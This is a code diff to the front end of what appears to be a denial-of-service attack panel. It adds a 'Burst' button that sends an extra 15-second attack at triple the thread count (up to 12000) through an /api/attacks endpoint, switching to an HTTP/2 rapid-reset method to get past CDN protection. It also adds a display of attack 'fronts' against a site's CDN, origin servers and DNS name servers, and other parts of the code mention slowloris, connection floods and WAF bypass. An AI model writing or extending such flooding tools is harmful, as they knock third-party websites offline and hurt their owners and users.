@@ -1114,6 +1114,10 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
   /* Geass Override launch flash effect */
   const [geassFlash, setGeassFlash] = useState(false);
 
+  /* Burst mode — fires a short 3× threads surge alongside main attack */
+  const [isBursting, setIsBursting] = useState(false);
+  const burstAttackIdRef = useRef<number | null>(null);
+
   /* Cascade attack state */
   const [isCascading, setIsCascading] = useState(false);
   const [cascadePhase, setCascadePhase] = useState(0); // 1=conn-flood, 2=slowloris, 3=waf-bypass
@@ -1798,6 +1802,47 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
     }, 1500);
     return () => clearInterval(iv);
   }, [isRunning, clusterAttackIds]);
+
+  /* ── Burst: 15s surge at 3× threads fired alongside main attack ── */
+  async function handleBurst() {
+    if (!isRunning || !target.trim() || isBursting) return;
+    setIsBursting(true);
+    addLog("💥 BURST — disparando surto 3× threads por 15s...", "warn");
+    const isHttpsTarget = /^https:/i.test(target.trim());
+    const portFromTarget = (() => {
+      try { const u = new URL(target.trim()); return parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80); } catch { return isHttpsTarget ? 443 : 80; }
+    })();
+    const burstPort    = method.includes("dns") ? 53 : portFromTarget;
+    const burstThreads = Math.min(threads * 3, 12000);
+    // Use a fast CDN-bypass method for the burst, regardless of current method
+    const burstMethod  = ["geass-absolutum","geass-override","geass-ultima"].includes(method)
+      ? "rapid-reset"
+      : method;
+    try {
+      const API = import.meta.env.BASE_URL.replace(/\/$/, "");
+      const r = await fetch(`${API}/api/attacks`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ target: target.trim(), port: burstPort, method: burstMethod, duration: 15, threads: burstThreads }),
+      });
+      if (!r.ok) throw new Error(`HTTP ${r.status}`);
+      const data = await r.json() as { id: number };
+      burstAttackIdRef.current = data.id;
+      addLog(`💥 BURST #${data.id} ativo — ${burstThreads} threads por 15s`, "success");
+      addToast("geass", "BURST ATIVO", `${burstThreads} threads | 15s | ${burstMethod}`);
+      setTimeout(async () => {
+        if (burstAttackIdRef.current !== null) {
+          try { await fetch(`${API}/api/attacks/${burstAttackIdRef.current}/stop`, { method: "POST" }); } catch { /* ignore */ }
+          burstAttackIdRef.current = null;
+        }
+        setIsBursting(false);
+        addLog("💥 BURST concluído.", "info");
+      }, 16_000);
+    } catch (e) {
+      addLog(`✕ Burst falhou: ${e instanceof Error ? e.message : String(e)}`, "error");
+      setIsBursting(false);
+    }
+  }
 
   /* ── Actions ── */
   async function handleLaunch() {
@@ -5193,6 +5238,36 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
               )}
             </div>
 
+            {/* Fronts indicator — shown during geass-absolutum */}
+            {isRunning && method === "geass-absolutum" && (
+              <div style={{
+                display: "flex", gap: 4, flexWrap: "wrap", marginBottom: 6,
+                padding: "5px 8px", borderRadius: 6,
+                background: "rgba(80,0,0,0.35)", border: "1px solid rgba(212,175,55,0.2)",
+              }}>
+                {[
+                  { label: "A: CDN 13v", color: "#D4AF37", active: true },
+                  { label: "B: Origin", color: "#ef4444", active: false, hint: "descobrindo..." },
+                  { label: "C: DNS NS", color: "#60a5fa", active: true },
+                  { label: "D: Spray", color: "#a78bfa", active: false, hint: "deploy only" },
+                ].map(f => (
+                  <span key={f.label} style={{
+                    fontSize: 9, fontWeight: 700, fontFamily: "monospace",
+                    padding: "2px 6px", borderRadius: 4,
+                    background: f.active ? `${f.color}22` : "rgba(255,255,255,0.03)",
+                    border: `1px solid ${f.active ? f.color : "rgba(255,255,255,0.1)"}`,
+                    color: f.active ? f.color : "#555",
+                    letterSpacing: 0.5,
+                  }}>
+                    {f.active ? "●" : "○"} {f.label}{f.hint ? ` (${f.hint})` : ""}
+                  </span>
+                ))}
+                <span style={{ fontSize: 9, color: "#666", alignSelf: "center", marginLeft: 2 }}>
+                  fronts ativos
+                </span>
+              </div>
+            )}
+
             {/* Action row */}
             <div className="lb-action-row">
               <button
@@ -5203,6 +5278,29 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                 <img src={GEASS_SYMBOL} className="lb-btn-glyph-img" alt=""/>
                 {isRunning ? "ABORT GEASS" : "COMMAND GEASS"}
               </button>
+              {/* BURST button — visible only when attack is running */}
+              {isRunning && (
+                <button
+                  title="Burst: dispara surto 3× threads por 15s"
+                  onClick={handleBurst}
+                  disabled={isBursting}
+                  style={{
+                    padding: "0 10px", height: 36, borderRadius: 6, border: "none",
+                    background: isBursting
+                      ? "rgba(239,68,68,0.15)"
+                      : "linear-gradient(135deg, #7f1d1d 0%, #991b1b 100%)",
+                    color: isBursting ? "#ef4444" : "#fca5a5",
+                    fontWeight: 800, fontSize: 11, fontFamily: "monospace",
+                    cursor: isBursting ? "not-allowed" : "pointer",
+                    letterSpacing: 1,
+                    boxShadow: isBursting ? "none" : "0 0 8px rgba(239,68,68,0.4)",
+                    transition: "all 0.2s",
+                    flexShrink: 0,
+                  }}
+                >
+                  {isBursting ? "💥 BURST..." : "💥 BURST"}
+                </button>
+              )}
               <button className="lb-btn-icon lb-btn-gold" title="Clear terminal" onClick={handleClearLogs}>⚡</button>
               <button className="lb-btn-icon lb-btn-dim"  title="Export logs"    onClick={handleExportLogs}>⎘</button>
               <button className={`lb-btn-icon ${soundEnabled ? "lb-btn-gold" : "lb-btn-dim"}`}
